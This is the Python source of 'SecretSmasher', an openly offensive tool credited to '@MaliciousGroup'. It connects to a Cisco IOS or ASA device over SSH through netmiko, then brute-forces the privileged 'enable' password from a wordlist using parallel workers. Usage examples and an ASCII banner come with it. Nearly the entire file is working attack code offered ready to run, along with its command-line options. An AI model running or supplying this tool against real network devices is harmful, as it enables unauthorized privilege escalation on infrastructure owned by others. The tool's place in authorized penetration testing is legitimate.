import concurrent.futures
import asyncio
import logging
import netmiko

from pathlib import Path

logging.basicConfig(level=logging.WARNING)

red = "\x1b[31;1m"
bold = "\x1b[1m"
reset = "\x1b[0m"
green = "\x1b[32;1m"


class SecretSmasher:

    def __init__(self, host, user, password, device_type, secrets, workers):
        self.host: str = host
        self.user: str = user
        self.password: str = password
        self.device_type: str = device_type
        self.secrets: list = secrets
        self.workers: int = int(workers)
        self.work_queue = asyncio.Queue()
        self.found: bool = False

    async def device_bootstrap(self):
        try:
            device = {
                'host': self.host,
                'username': self.user,
                'password': self.password,
                'device_type': self.device_type
            }
            print(f'{bold}[*] - Attempting an SSH connection to host {device["host"]}{reset}')
            print(f'{bold}[*] - Workers being used: {str(self.workers)}{reset}')

            for x in self.secrets:
                await self.work_queue.put(x)

            await self.device_handler(device)
        except asyncio.CancelledError:
            pass

    async def device_handler(self, device: dict):
        try:
            loop = asyncio.get_event_loop()
            with concurrent.futures.ThreadPoolExecutor() as pool:
                blocking = [loop.run_in_executor(pool, self.connect, device, i) for i in range(self.workers)]
                completed, pending = await asyncio.wait(blocking)
                _ = [t.result() for t in completed]
        except asyncio.CancelledError:
            pass

    def connect(self, device: dict, instance_id: int):
        try:
            dev = netmiko.Netmiko(**device)
            print(f'{green}[*] - Successfully connected to host {device["host"]} on worker {instance_id}{reset}')
            if dev.check_enable_mode():
                print(f'{green}[!] - We are currently in level 15 privilege mode!  No password?!{reset}')
                return

            secret = None

            while not self.found:
                if dev.check_enable_mode():
                    print(f'{green}[!] - Password "{secret}" worked as the secret password!{reset}')
                    self.found = True
                    break
                dev.send_command('enable', expect_string='word', delay_factor=2)
                secret = self.work_queue.get_nowait()
                print(f'{bold}[*] - Attempting "enable" password {secret}{reset}')
                output = dev.send_command_timing(secret, strip_prompt=False)
                if '#' in output:
                    continue
                secret = self.work_queue.get_nowait()
                print(f'{bold}[*] - Attempting "enable" password {secret}{reset}')
                output = dev.send_command_timing(secret, strip_prompt=False)
                if '#' in output:
                    continue
                secret = self.work_queue.get_nowait()
                print(f'{bold}[*] - Attempting "enable" password {secret}{reset}')
                output = dev.send_command_timing(secret, strip_prompt=False)
                if '#' in output:
                    continue

            print(f'{bold}[*] - Closing worker {instance_id}!{reset}')

        except asyncio.queues.QueueEmpty:
            # print(f'{red}[x] - The password attempts have been exhausted... try another list?')
            pass

        except netmiko.ssh_exception as e:
            print("SSH EXCEPTION --> DERP " + e)

        except netmiko.NetmikoAuthenticationException:
            print(f'{red}[x] - SSH Authentication Error using --> {device["username"]} and {device["password"]}')

        except netmiko.NetMikoTimeoutException:
            print(f'{red}[x] - SSH Connection to {device["host"]} timed out')


def intro():
    output: str = f"""
{red}
    ███████╗███████╗ ██████╗██████╗ ███████╗████████╗          
    ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝╚══██╔══╝          
    ███████╗█████╗  ██║     ██████╔╝█████╗     ██║             
    ╚════██║██╔══╝  ██║     ██╔══██╗██╔══╝     ██║             
    ███████║███████╗╚██████╗██║  ██║███████╗   ██║             
    ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝             
                                                           
███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{reset}
                                                           
    "{bold}Everything is a secret, until it isn't" -d3d{reset}

{red}[*] - Author:     d3d (@MaliciousGroup)
{red}[*] - Version:    v1.0{reset}
    """
    print(output)


def __return_list(__item: str) -> list:
    """Function to return a list of file contents or None"""
    if Path(__item).is_file():
        return [x.rstrip() for x in open(__item)]
    return []


def usage():
    output: str = f"""
{bold}Single Target{reset}:
  {argv[0]} -h "10.10.10.1" -u cisco -p cisco -d cisco_ios -s possible_secrets.txt
  {argv[0]} -h "10.10.10.1" -u cisco -p cisco -d cisco_ios -s /path/to/wordlist.txt -w 5

{bold}Application Options{reset}:
  '-h', '--host'        - Set the target address to the Cisco Device
  '-u', '--user'        - Set the username to the Cisco Device
  '-p', '--pass'        - Set the password to the Cisco Device
  '-d', '--device_type' - Set the Cisco device_type - Options: ['cisco_ios', 'cisco_asa']
  '-s', '--secrets'     - Set the file containing possible secrets to attempt
  '-w', '--workers'     - Set the max number of workers to run per host
    """
    print(output)


if __name__ == "__main__":
    import argparse
    from sys import argv

    parser = argparse.ArgumentParser(add_help=False, usage=usage)
    parser.add_argument('-h', '--host', action='store', dest='host', default='')
    parser.add_argument('-u', '--users', action='store', dest='user', default='')
    parser.add_argument('-p', '--passwords', action='store', dest='password', default='')
    parser.add_argument('-d', '--device_type', action='store', dest='device_type', default='')
    parser.add_argument('-s', '--secrets', action='store', dest='secrets', default='')
    parser.add_argument('-w', '--workers', action='store', dest='workers', default='1')
    arg = None

    try:
        arg = parser.parse_args()
    except TypeError:
        usage()
        exit(f"{red}[x] - Invalid options specified.")

    if not arg.host:
        usage()
        exit(f"{red}[x] - The 'host' option is required to start attack")

    if not arg.user:
        usage()
        exit(f"{red}[x] - The 'user' option is required to start attack")

    if not arg.password:
        usage()
        exit(f"{red}[x] - The 'password' option is required to start attack")

    if not arg.device_type:
        usage()
        exit(f"{red}[x] - The 'device_type' option is required to start attack")

    if not arg.secrets:
        usage()
        exit(f"{red}[x] - The 'secrets' option is required to start attack")

    if not arg.workers:
        arg.workers = '1'

    if arg.host and arg.user and arg.password and arg.secrets and arg.device_type:
        possible_secrets: list = __return_list(str(arg.secrets))
        
        if len(possible_secrets) == 0:
            exit(f"{red}[x] - The 'secrets' option needs to be a file containing passwords to attempt")

        intro()
        arg.secrets = possible_secrets
        ss = SecretSmasher(arg.host, arg.user, arg.password, arg.device_type, arg.secrets, arg.workers)
        try:
            asyncio.run(ss.device_bootstrap())
        except asyncio.CancelledError:
            pass
        except KeyboardInterrupt:
            pass
